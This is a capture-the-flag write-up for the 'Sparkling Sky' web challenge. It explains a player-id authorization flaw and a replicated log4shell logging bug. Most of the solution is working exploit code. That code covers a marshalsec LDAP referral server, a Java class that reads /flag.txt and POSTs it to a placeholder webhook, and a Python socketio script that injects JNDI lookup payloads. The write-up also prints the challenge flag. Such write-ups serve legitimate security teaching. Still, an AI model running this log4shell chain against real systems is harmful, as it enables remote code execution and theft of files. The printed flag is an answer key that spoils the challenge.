# Sparkling Sky

- **Category:** Web
- **Solves:** 49
- **Difficulty:** Medium-Easy
- **Author:** @sanmatte

## Description

I am developing a game with websockets in python. I left my pc to a java fan, I think he really messed up.

## Details

The challenge is a minigame where players can move their character (a bird) on the screen. When an unexpected bird movement happens it is logged by the anticheat.

## Solution

The website had 2 major vulnerabilities. You can control another player bird with the parameter `data['user_id']`. And the logging mechanism was a replication of `log4shell` vulnerability.

To wrap it up this is a simple guide to exploit the vulnerability.

- Set up an LDPA server
- Create a java class that will be executed by log4j
- Host the java class
  
### LDPA Server

You can use marshalsec:
```bash
git clone https://github.com/mbechler/marshalsec.git
cd ./marshalsec/
mvn clean package -DskipTests


java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<YOUR WEBSERVER IP>:<YOUR WEBSERVER PORT>/#Exploit"
```

### Java Class

You need to create a java class, that will be executed by the challenge, to retrieve the flag.

On *Exploit.java*:
```java
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Exploit {

    static {

        try {
            String filePath = "/flag.txt";

            // Read the contents of the file into a String
            String fileContent = new String(Files.readAllBytes(Paths.get(filePath)));

            String url = "https://<YOUR WEBHOOK>/upload";

            URL obj = new URL(url);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("POST");
            con.setDoOutput(true);
            OutputStream os = con.getOutputStream();
            byte[] input = fileContent.getBytes("utf-8");
            os.write(input, 0, input.length);
            int responseCode = con.getResponseCode();
            System.out.println("sent: " + responseCode);
            con.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
Compile the java file:
```bash
javac Exploit.java
```

### Host the java class
On the directory where the java class is saved:
```bash
python3 -m http.server <YOUR WEBSERVER PORT>
```

### Redirect Log4j to your webserver
```python
import requests
import socketio

URL = "http://sparklingsky.challs.srdnlen.it:8081/"
credentials = {
    "username": "user1337",
    "password": "user1337"
}

session = requests.Session()

try:
    login_response = session.post(URL+"/login", data=credentials)
    if login_response.status_code == 200:
        print("Login successful")
    else:
        print("Login failed: ", login_response.status_code, login_response.text)
        exit()
except Exception as e:
    print("error during login: ", e)
    exit()

sio = socketio.Client()

@sio.on('connect')
def on_connect():
    print("Connected to the server")

@sio.on('update_bird_positions')
def on_update_bird_positions(data):
    print("Received bird positions: ", data)

try:
    cookie = session.cookies.get_dict()
    headers = {"Cookie": f"session={cookie['session']}"}
    sio.connect(URL, headers=headers)
    print("Connecting to the socket server...")
except Exception as e:
    print("error during socket connection: ", e)
    exit()

from time import sleep
sleep(1) # wait to receive server response
sio.emit('move_bird', {"user_id":1,"x": 0, "y": 0, "angle": "${jndi:ldap://<YOUR LDPA_SERVER IP>:1389/Exploit}"})
sleep(1) # wait to receive server response
sio.emit('move_bird', {"user_id":1,"x": 10000000000000000, "y": 10000000000000000, "angle": "${jndi:ldap://<YOUR LDPA_SERVER IP>:1389/Exploit}"})
sleep(1) # wait to receive server response
```

### FLAG
```
srdnlen{I_th1nk_h3_r34lly_m3ss3d_up}
```
